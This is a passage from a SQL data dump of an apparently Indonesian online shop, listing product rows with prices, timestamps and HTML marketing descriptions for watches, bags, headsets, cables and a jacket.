(82,10,2,14,313000,50000,'2019-08-06 10:49:32','2019-08-12 03:06:37',NULL,0,NULL,0,0),
(83,10,2,15,232000,50000,'2019-08-06 11:05:28','2019-08-06 11:05:28',NULL,0,NULL,1,0),
(84,10,2,17,252000,50000,'2019-08-06 11:06:02','2019-08-06 11:06:02',NULL,0,NULL,1,1),
(85,10,2,16,205000,50000,'2019-08-06 12:29:43','2019-08-06 12:29:43',NULL,0,NULL,1,0),
(86,10,2,20,257000,50000,'2019-08-06 12:53:25','2019-08-28 14:09:46',NULL,1,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p>test</p></body></html>\n',0,0),
(87,28,14,11,338000,100000,'2019-08-07 02:13:47','2019-08-27 21:56:54',350000,1,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><strong>22222</strong></p></body></html>\n',1,1),
(88,28,14,12,230000,100000,'2019-08-07 02:13:58','2019-08-27 19:51:44',250000,1,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"display: none;\">&nbsp;</span>UNTUK KAMU YANG BERJIWA BERANI DAN TANGGUH. Tampilkan sisi maskulinmu bersama Jaymodric leather jacket</p>\n\n<p>&nbsp;</p>\n\n<p>##### Materials<br>\nHigh Quality PU Leather</p>\n\n<p>&nbsp;</p>\n\n<p>##### Fitur<br>\n&bull;&nbsp;&nbsp; &nbsp;Berbahan dasar PU leather kualitas tinggi yang tahan air dan tidak kaku sehingga nyaman dipakai bahkan seharian.<br>\n&bull;&nbsp;&nbsp; &nbsp;Lebih nyaman lagi dengan furing dalam berbahan halus<br>\n&bull;&nbsp;&nbsp; &nbsp;Inside pocket bisa untuk menyimpan gadget anda saat hujan agar tetap aman.<br>\n&bull;&nbsp;&nbsp; &nbsp;Desain saku tambahan pada lengan menjadikan anda lebih bergaya saat memakainnya.<br>\n&bull;&nbsp;&nbsp; &nbsp;Menggunakan zipper YKK original<br>\n&bull;&nbsp;&nbsp; &nbsp;Tersedia dalam dua varian warna yang sedang trend, red dan brown.</p>\n\n<p>&nbsp;</p>\n\n<p>##### Tinggi/Berat badan Talent<br>\n180cm/72kg<br>\nTalent menggunakan size XL<span style=\"display: none;\">&nbsp;</span></p>\n\n<p>&nbsp;</p></body></html>\n',1,0),
(89,28,14,32,66000,10000,'2019-08-07 02:14:17','2019-08-27 19:55:26',NULL,0,NULL,0,1),
(124,19,8,13,192000,50000,'2019-08-07 07:53:57','2019-08-07 09:17:06',371000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(125,19,8,14,310000,52000,'2019-08-07 07:54:33','2019-08-07 09:17:23',585000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(126,19,8,17,250000,53000,'2019-08-07 07:55:34','2019-08-07 09:17:42',540000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(127,19,8,18,220000,50000,'2019-08-07 07:55:51','2019-08-07 09:17:59',325000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(128,19,8,19,230000,53000,'2019-08-07 07:56:04','2019-08-07 09:18:11',575000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(129,19,8,20,260000,58000,'2019-08-07 07:56:23','2019-08-07 09:18:51',780000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(130,19,8,21,280000,58000,'2019-08-07 07:56:55','2019-08-07 09:19:04',725000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(131,19,8,24,265000,50000,'2019-08-07 07:57:19','2019-08-07 09:11:42',395000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL untuk kebahagiaan sang buah hati. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan ceria yang cocok dikombinasikan dengan berbagai warna pakaian sang buah hati. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(132,19,8,25,255000,50000,'2019-08-07 07:57:28','2019-08-07 09:23:27',270000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL untuk kebahagiaan sang buah hati. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan ceria yang cocok dikombinasikan dengan berbagai warna pakaian sang buah hati. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(133,19,8,26,320000,52000,'2019-08-07 07:57:37','2019-08-07 09:30:50',338000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL Sporty&nbsp;Edition siap menemani aktivitas anda sepanjang hari. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan <b>#Sporty </b>yang cocok untuk si kecil, remaja maupun dewasa. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(134,19,8,28,355000,52000,'2019-08-07 07:57:59','2019-08-07 09:38:34',750000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL&nbsp;siap menemani aktivitas anda sepanjang hari. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan <b>#Sporty </b>yang cocok untuk si kecil, remaja maupun dewasa. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(135,19,8,29,325000,50000,'2019-08-07 07:58:11','2019-08-07 09:37:42',629000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL untuk kebahagiaan sang buah hati. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan ceria yang cocok dikombinasikan dengan berbagai warna pakaian sang buah hati. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(136,19,8,30,265000,50000,'2019-08-07 07:58:26','2019-08-07 09:39:20',599000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL untuk kebahagiaan sang buah hati. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan ceria yang cocok dikombinasikan dengan berbagai warna pakaian sang buah hati. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(137,19,8,31,255000,50000,'2019-08-07 07:58:45','2019-08-07 09:39:59',450000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL untuk kebahagiaan sang buah hati. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan ceria yang cocok dikombinasikan dengan berbagai warna pakaian sang buah hati. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(138,19,8,32,79000,43000,'2019-08-07 07:59:09','2019-08-07 10:16:07',150000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>ONE CABLE FOR ALL YOUR DEVICES</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Kabel Data/Charger 3 in 1 yang dilengkapi dengan 3 jenis port berbeda, seperti:</span></span></p>\n\n<ul><li style=\"margin-left:8px\"><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Micro USB</span></span></li>\n	<li style=\"margin-left:8px\"><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>USB Type-C</span></span></li>\n	<li style=\"margin-left:8px\"><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Lightning</span></span></li>\n</ul><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Solusi tepat untuk keseharian anda yang bermobilisasi tinggi.</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'><b>#LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(139,19,8,35,190000,40000,'2019-08-07 07:59:33','2019-08-27 12:37:21',549000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Headset Bluetooth Sporty ( Nirkabel ) cocok menemani kamu yang trendy sehari-hari.&nbsp;</span></span><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'><b>#LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(140,19,8,37,135000,25000,'2019-08-07 07:59:51','2019-08-07 10:15:20',275000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Headset Bluetooth Sporty ( Nirkabel ) cocok menemani kamu yang trendy sehari-hari. <b>#LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(141,19,8,43,165000,30000,'2019-08-07 07:59:59','2019-08-07 10:17:43',599000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Headset Bluetooth Sporty ( Nirkabel ) cocok menemani kamu yang trendy sehari-hari. <b>#LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(142,19,8,44,160000,25000,'2019-08-07 08:00:09','2019-08-07 10:20:10',265000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Portable Bluetooth Speaker ( Nirkabel ) cocok menemani kamu yang pecinta musik. <b>#LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(143,19,8,45,315000,42000,'2019-08-07 08:00:32','2019-08-07 10:35:41',415000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS MULTI GAYA WANITA</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Dapat dijadikan tas ransel maupun tas jinjing. So fashionable! So colorful! Sangat cocok untuk kamu&nbsp;yang Fashionista! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(144,19,8,46,365000,80000,'2019-08-07 08:00:43','2019-08-07 10:35:04',565000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS MULTI GAYA WANITA</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Dapat dijadikan tas ransel maupun tas jinjing. So fashionable! So colorful! Sangat cocok untuk kamu&nbsp;yang fashionista! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(145,19,8,47,280000,30000,'2019-08-07 08:00:53','2019-08-07 10:45:00',575000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS RANSEL PRIA SPORTY</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>So sporty! So adventurous! <strong>#Waterproof</strong> dan bisa diisi laptop loh&hellip; Sangat cocok untuk kamu yang berjiwa Sporty &amp; Petualang! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(146,19,8,48,205000,28000,'2019-08-07 08:01:19','2019-08-07 10:39:03',220000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS MULTI GAYA WANITA</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Dapat dijadikan tas selempang&nbsp;maupun tas jinjing. So fashionable! So colorful! Sangat cocok untuk kamu yang fashionista! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(147,19,8,50,275000,25000,'2019-08-07 08:01:43','2019-08-07 10:45:41',799000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS RANSEL PRIA SPORTY</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>So sporty! So adventurous! <strong>#</strong><strong>Waterproof</strong> dan bisa diisi laptop loh... Sangat cocok untuk kamu yang berjiwa Sporty &amp; Petualang! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(148,19,8,49,370000,34000,'2019-08-07 08:02:13','2019-08-07 10:48:42',699000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS RANSEL SPORTY UNISEX</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>So sporty! So adventurous! <b>#Waterproof</b> loh.. Sangat cocok untuk kamu yang berjiwa Sporty &amp; Petualang! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(149,19,8,27,265000,50000,'2019-08-07 08:03:08','2019-08-07 10:50:08',395000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL untuk kebahagiaan sang buah hati. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan ceria yang cocok dikombinasikan dengan berbagai warna pakaian sang buah hati. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(150,19,8,23,255000,50000,'2019-08-07 08:03:26','2019-08-07 10:50:42',599000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Jam Tangan MARVEL untuk kebahagiaan sang buah hati. <b>#MARVEL </b>Super Heroes yang selalu trendi sepanjang masa. Jam Tangan ceria yang cocok dikombinasikan dengan berbagai warna pakaian sang buah hati. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(151,19,8,36,110000,34000,'2019-08-07 08:03:48','2019-08-08 10:20:48',225000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Headset Bluetooth Mini HiFi ( Nirkabel ) cocok menemani kamu yang trendy dan bermobilisasi tinggi sehari-hari. <b>#LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(152,19,8,12,180000,50000,'2019-08-07 08:06:58','2019-08-07 10:55:29',375000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(153,19,8,15,230000,52500,'2019-08-07 08:07:09','2019-08-07 10:56:13',555000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(154,19,8,16,200000,50000,'2019-08-07 08:07:27','2019-08-07 10:57:33',289000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(155,19,8,22,150000,50000,'2019-08-07 08:07:40','2019-08-07 10:58:17',385000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Arloji <b>#elegan</b> mengekspresikan kepribadian pria yang bercita rasa tinggi. <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(156,19,8,34,75000,39000,'2019-08-07 08:09:39','2019-08-07 11:00:01',NULL,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>ONE CABLE FOR ALL YOUR DEVICES</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Kabel Data/Charger 3 in 1 yang dilengkapi dengan 3 jenis port berbeda, seperti:</span></span></p>\n\n<ul><li style=\"margin-left:8px\"><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Micro USB</span></span></li>\n	<li style=\"margin-left:8px\"><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>USB Type-C</span></span></li>\n	<li style=\"margin-left:8px\"><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Lightning</span></span></li>\n</ul><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Solusi tepat untuk keseharian anda yang bermobilisasi tinggi.</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'><b>#LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(157,19,8,51,310000,27000,'2019-08-07 08:10:28','2019-08-07 11:01:49',599000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS RANSEL SPORTY UNISEX</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>So sporty! So adventurous! Sangat cocok untuk kamu yang berjiwa Sporty &amp; Petualang! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(158,19,8,33,75000,39000,'2019-08-07 08:11:15','2019-08-07 11:04:56',87000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'><b>#Sporty &amp; #Goodquality #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(159,19,8,52,300000,25000,'2019-08-07 08:11:55','2019-08-07 11:09:37',555000,0,'<!DOCTYPE html PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\" \"http://www.w3.org/TR/REC-html40/loose.dtd\">\n<html><body><p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>TAS KERJA KASUAL</span></span></p>\n\n<p><span style=\"font-size:12pt\"><span style=\'font-family:\"Times New Roman\",serif\'>Tas Laptop kasual yang siap mendukung aktifitas anda sehari-hari! <b>#LIMITEDEDITION #LIMITEDSTOCK #HARGATERBAIK</b> hanya di <span style=\"color:#0070c0\">shopme.id</span></span></span></p></body></html>\n',1,0),
(160,31,17,19,250000,68000,'2019-08-07 12:52:44','2019-08-07 12:52:44',NULL,0,NULL,1,0),
(161,31,17,13,217000,70000,'2019-08-07 12:58:13','2019-08-07 12:58:13',NULL,0,NULL,1,0),
(162,31,17,29,340000,60000,'2019-08-07 13:17:37','2019-08-07 13:17:37',NULL,0,NULL,1,0),
(163,31,17,44,170000,30000,'2019-08-07 13:18:40','2019-08-07 13:18:40',NULL,0,NULL,1,0),
(164,28,14,45,373000,100000,'2019-08-08 03:35:52','2019-08-08 03:35:52',NULL,0,NULL,1,0),
(165,32,18,11,278000,40000,'2019-08-08 03:44:55','2019-08-08 03:44:55',NULL,0,NULL,1,0),
(166,32,18,19,227000,50000,'2019-08-08 03:54:51','2019-08-08 03:54:51',NULL,0,NULL,1,0),
(167,32,18,12,180000,50000,'2019-08-08 03:55:11','2019-08-08 03:55:11',NULL,0,NULL,1,0),
(168,32,18,18,220000,50000,'2019-08-08 03:55:43','2019-08-08 03:55:43',NULL,0,NULL,1,0),
(169,32,18,15,227500,50000,'2019-08-08 03:56:24','2019-08-08 03:56:24',NULL,0,NULL,1,0),
(170,32,18,21,272000,50000,'2019-08-08 03:56:42','2019-08-08 03:56:42',NULL,0,NULL,1,0),
(171,32,18,22,150000,50000,'2019-08-08 03:56:55','2019-08-08 03:56:55',NULL,0,NULL,1,0),
(172,32,18,29,325000,50000,'2019-08-08 03:59:01','2019-08-08 03:59:01',NULL,0,NULL,1,0),
(173,32,18,37,150000,40000,'2019-08-08 04:01:36','2019-08-08 04:01:36',NULL,0,NULL,1,0),
(174,32,18,32,46000,10000,'2019-08-08 04:01:53','2019-08-08 04:01:53',NULL,0,NULL,1,0),
(175,32,18,43,165000,30000,'2019-08-08 04:02:15','2019-08-08 04:02:15',NULL,0,NULL,1,0),
